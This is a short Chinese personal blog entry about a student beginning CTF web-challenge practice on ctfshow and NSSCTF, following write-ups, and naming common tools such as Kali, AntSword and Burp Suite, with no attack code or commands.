<h1 id="开刷ctf-web"><a href="#开刷ctf-web" class="headerlink" title="开刷ctf web"></a>开刷ctf web</h1><p>ctf里面我感兴趣的就是web了，我在放假之前就有尝试做一些web题，但是自己还是太菜了，一般就是看wp才知道怎么做<br>快开学了，也去刷刷了web踢，不过有了打靶机经验，做起来还是不一样的，虽然还是自己做不出来，但是看wp能看的更懂了<br>我先去ctfshow里面的web部分做了最开始的那块，但是这里前面还是有点善良，后面基本都是代码审计的，不适合新手<br><img src="https://pic1.imgdb.cn/item/67b0bdc4d0e0a243d4ffb41f.png"><br>前面做的时候都有整理，所以看到后面那么ex的题目还是硬着头皮把网上搜到的wp整理了一下然后上传上去了<br>后面做nssctf里面的swpuctf新生赛的题目了，这个题目还是特别好的，适合新手，质量也高<br><img src="https://pic1.imgdb.cn/item/67b0be12d0e0a243d4ffb426.png"><br>这里我之前大概就做了十题左右，然后我自己再重新开始做，然后边做边写wp，现在做和以前做的感觉完全不一样，现在会做了而且思路也清晰，也能学到不少。<br>所以直接就开干吧，只要你有一台电脑 装一个kali直接干，碰到什么学什么，看wp用什么工具就下什么。基本常用的也就蚁剑，bp也没啥特别的。<br>希望自己在网安这条道路上慢慢加油了，不知道开学之后还有多少时间唉</p>
]]></content>
      <categories>
        <category>生活</category>
      </categories>
      <tags>
        <tag>生活</tag>
      </tags>
  </entry>
</search>
